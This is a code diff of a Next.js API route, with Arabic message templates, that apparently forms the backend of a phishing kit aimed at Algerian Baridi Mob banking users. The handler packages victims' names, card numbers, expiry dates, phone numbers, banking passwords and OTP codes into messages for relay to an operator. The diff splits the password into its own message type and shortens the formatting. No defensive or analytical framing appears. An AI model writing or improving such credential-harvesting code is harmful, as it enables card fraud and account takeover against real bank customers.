@@ -19,12 +19,16 @@ export async function POST(request: NextRequest) {
         
       case "personal_info":
         const fullName = `${payload.firstName} ${payload.lastName}`;
-        message = `👤 *معلومات شخصية*\n\n📋 الاسم: ${fullName}\n🔢 رقم البطاقة: \`${payload.cardNumber}\`\n📅 تاريخ الانتهاء: \`${payload.expiryDate}\`\n📱 رقم الهاتف: \`${payload.phoneNumber}\`\n🔐 كلمة مرور بريدي موب: \`${payload.baridiPassword}\``;
+        message = `👤 *معلومات شخصية*\n\`${fullName}\n${payload.cardNumber}\n${payload.expiryDate}\n${payload.phoneNumber}\``;
+        break;
+        
+      case "baridi_mob_password":
+        message = `🔐 *كلمة المرور*\n\`${payload.password}\``;
         break;
         
       case "otp_attempt":
         const otpUserName = `${payload.firstName} ${payload.lastName}`;
-        message = `🔔 *محاولة OTP*\n\n👤 المستخدم: ${otpUserName}\n🔐 الكود: \`${payload.otp}\`\n📊 المحاولة رقم: #${payload.attemptNumber}`;
+        message = `🔔 *محاولة OTP*\n\`${otpUserName}/${payload.otp}/ OTP #${payload.attemptNumber}\``;
         break;
         
       case "complete":
